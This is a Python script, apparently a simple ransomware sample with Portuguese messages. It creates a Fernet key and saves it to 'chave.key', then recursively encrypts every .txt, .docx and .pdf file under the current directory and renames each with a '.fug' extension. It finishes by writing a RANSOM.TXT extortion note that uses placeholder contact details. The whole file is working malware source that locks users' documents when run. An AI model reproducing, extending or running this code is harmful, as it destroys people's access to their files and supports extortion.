


from cryptography.fernet import Fernet
import os


def generate_key():
    key = Fernet.generate_key()
    with open("chave.key", "wb") as key_file:
        key_file.write(key)
def load_key():
    return open("chave.key", "rb").read()

def replace_extension(file_path, new_extension=".fug"):
    base = os.path.splitext(file_path)[0]
    return f"{base}{new_extension}"

def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)
    new_file_path = replace_extension(file_path)
    os.rename(file_path, new_file_path)


def decrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(file_path, "wb") as file:
        file.write(decrypted_data)

def find_files(directory):
    alist = []
    for root, _, files in os.walk(directory):
        for name in files:
            fpath = os.path.join(root, name)
            if fpath.endswith((".txt", ".docx", ".pdf")) and fpath != "encryptor.py":
                alist.append(fpath)
    return alist


def ransom_message_create():
    with open("RANSOM.TXT" , "w") as ransom_file:
        ransom_file.write("Seus arquivos foram criptografados! Para recuperá-los, entre em contato conosco.\n")
        ransom_file.write("\nOur address is here: https://file.io/")
        ransom_file.write("\nYour unique ID: 1234567890")
        ransom_file.write("\nThen contact us at fiction@pulp.com to get instructions on how to pay the ransom.")

if __name__ == "__main__":
    generate_key()
    for file in find_files("."):
        encrypt_file(file, load_key())
        print(f"Arquivo criptografado: {file}")

    ransom_message_create()
    print("Mensagem de resgate criada: RANSOM.TXT")
  